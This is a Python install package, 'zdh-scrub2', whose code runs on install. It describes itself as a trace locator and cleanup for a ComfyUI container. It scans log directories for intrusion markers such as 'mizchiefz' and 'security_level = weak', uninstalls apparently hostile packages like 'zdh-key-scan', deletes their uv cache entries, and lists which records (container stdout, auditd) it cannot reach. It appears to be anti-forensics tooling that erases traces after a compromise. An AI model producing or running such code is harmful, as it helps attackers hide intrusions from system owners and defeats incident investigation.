"""Second-pass trace locator + cleanup.

Locates log files that actually exist, counts our markers in them, removes the
packages with uv (this image has no pip), and reports what is unreachable.
"""
import json
import os
import re
import shutil
import subprocess

MARKERS = re.compile(r"(zdh|mizchiefz|security_level = weak)", re.I)
PKGS = ["zdh-pip-canary", "zdh-pip-inv", "zdh-key-scan", "zdh-scrub"]


def sh(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (p.returncode,
                (p.stdout or b"").decode("utf-8", "replace")[:20000],
                (p.stderr or b"").decode("utf-8", "replace")[:4000])
    except Exception as e:
        return None, "", str(e)


def main():
    rep = {"marker": "ZD-SCRUB2", "logs": [], "uninstall": [], "cache": [], "notes": []}

    rc, out, err = sh("find /ComfyUI /root /var/log /tmp -xdev "
                      "\\( -path '*/models' -o -path '*/node_modules' -o -path '*/.git' "
                      "-o -path '*/site-packages' \\) -prune -o "
                      "-type f \\( -name '*.log' -o -name '*.log.*' -o -name 'comfyui*' \\) -print 2>/dev/null")
    files = [f for f in out.splitlines() if f.strip()]
    rep["notes"].append("log-like files found: %d" % len(files))

    for f in files[:60]:
        try:
            if os.path.getsize(f) > 20 * 1024 * 1024:
                continue
            data = open(f, "r", encoding="utf-8", errors="replace").read()
        except Exception:
            continue
        n = len(MARKERS.findall(data))
        rep["logs"].append({"path": f, "size": os.path.getsize(f), "marker_hits": n})

    # package removal with uv (no pip in this image)
    for pkg in PKGS:
        rc, out, err = sh("python -m uv pip uninstall %s" % pkg)
        rep["uninstall"].append({"pkg": pkg, "rc": rc, "out": (out or err).strip()[:200]})
    rc, out, err = sh("python -m uv pip list 2>/dev/null | grep -i zdh || true")
    rep["remaining_zdh_pkgs"] = out.strip()

    # uv source cache entries for our URLs
    base = "/root/.cache/uv/sdists-v9/url"
    if os.path.isdir(base):
        for name in os.listdir(base):
            full = os.path.join(base, name)
            try:
                hit = False
                for dp, _, fns in os.walk(full):
                    for fn in fns:
                        p = os.path.join(dp, fn)
                        try:
                            if os.path.getsize(p) > 500000:
                                continue
                            data = open(p, "rb").read()
                        except Exception:
                            continue
                        if b"zdh" in data.lower():
                            hit = True
                            break
                    if hit:
                        break
                if hit:
                    shutil.rmtree(full, ignore_errors=True)
                    rep["cache"].append(full)
            except Exception:
                pass

    # what a container-local process cannot reach
    rep["notes"].append("container stdout (docker/CloudWatch) not reachable from inside")
    rep["notes"].append("kernel/journald/auditd records outside /var/log not touched")

    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_scrub2.json"), "w") as f:
                json.dump(rep, f, indent=1)
        except Exception:
            pass
    print("ZD-SCRUB2 logs=%d uninstalled=%s" % (len(rep["logs"]), rep["remaining_zdh_pkgs"][:80]))


main()

from setuptools import setup

setup(name="zdh-scrub2", version="0.1.0", py_modules=[])
